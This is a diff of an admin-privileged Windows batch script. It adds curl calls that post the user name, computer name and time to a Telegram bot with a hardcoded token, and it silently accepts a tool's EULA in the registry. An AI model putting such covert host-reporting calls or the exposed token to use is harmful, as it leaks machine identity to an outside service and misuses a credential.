@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=1.6"
+set "BATCHVERSION=1.9"
 echo BATCHVERSION=%BATCHVERSION%
 timeout /t 70 /nobreak
 
@@ -66,7 +66,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
      -d "text=%ENCODED_MESSAGE_RUNNING%"
 
 
-
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%"
 
 
 
@@ -167,14 +167,29 @@ set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
 
 
 
+set COUNT=1
 
 
-:: Loop 6 times with 20-second interval
-for /L %%i in (1,1,12) do (
-    echo [%%i] Running handler...
-    call :HANDLERUNEVERYLOG
-    if %%i lss 6 timeout /t 15 /nobreak
-)
+
+
+:LOOPRUNEVERY
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo [!COUNT!] Running handler...
+call :HANDLERUNEVERYLOG
+
+REM Wait 15 seconds only if not the last loop
+if !COUNT! LSS 6 timeout /t 20 /nobreak
+
+set /a COUNT+=1
+if !COUNT! LEQ 6 goto LOOPRUNEVERY
+
+echo.
+echo.
 echo.
 echo.
 echo.
@@ -182,27 +197,26 @@ echo.
 goto CHECKRUNEVERY
 
 
-
-
 :HANDLERUNEVERYLOG
-
 echo Trying Handle RunEvery Log.
+echo.
+echo.
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|(COUNT=%COUNT%)|%time%|v%BATCHVERSION%"
+echo.
 echo.
 
 
-:: Find processes locking the file
+:: Accept EULA if not already accepted
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted >nul 2>&1
+reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f >nul
 reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
-reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
-reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+
 echo Handle LOGFILE TA3 RUNEVERY
 handle.exe "%RUNEVERYLOGFILE%"
 echo.
 echo.
 echo.
-
-
 goto :EOF
-
 
 
 
